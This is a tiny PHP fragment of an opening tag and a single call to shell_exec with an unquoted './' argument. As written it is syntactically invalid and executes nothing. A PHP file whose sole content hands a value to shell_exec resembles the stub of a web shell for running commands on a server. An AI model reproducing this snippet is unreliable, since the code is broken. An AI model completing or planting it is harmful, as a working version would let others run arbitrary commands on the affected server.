<?php 
shell_exec(./)